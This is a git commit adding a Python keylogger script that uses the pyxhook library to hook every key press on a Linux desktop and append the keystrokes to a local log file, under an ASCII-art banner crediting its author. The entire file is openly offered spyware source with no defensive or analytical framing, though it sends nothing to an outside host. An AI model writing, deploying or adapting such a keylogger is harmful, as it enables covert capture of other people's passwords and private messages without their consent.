ff59693a341a3fc08933b021c05a36e07fc27f8b
Imad00x <53299920+Imad00x@users.noreply.github.com>
2019-07-25 11:53:26 +0100

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python
+
+import pyxhook
+
+"""
+	*--------------------------------------*
+	|          Coded by : ViRus06t          |
+	|                  R!oXm                |
+	*--------------------------------------*
+	   _                _    _       _     
+	  | |__   __ _  ___| | _| | __ _| |__  
+	  | '_ \ / _` |/ __| |/ / |/ _` | '_ \ 
+	  | | | | (_| | (__|   <| | (_| | |_) |
+	  |_| |_|\__,_|\___|_|\_\_|\__,_|_.__/ 
+	
+	               Keylogger
+	              -----------
+"""
+
+
+
+log_file='/home/virus06t/Desktop/file.log'
+
+def keypress(event):
+	log=open(log_file,'a')
+	if event.Key == 'space':
+		log.write(' ')
+	elif event.Key == 'Return':
+		log.write('\n')
+	elif len(event.Key) != 1:
+		log.write('[ '+event.Key+' ]')
+	else:
+		log.write(event.Key)
+
+key=pyxhook.HookManager()
+key.KeyDown=keypress
+key.HookKeyboard()
+key.start()
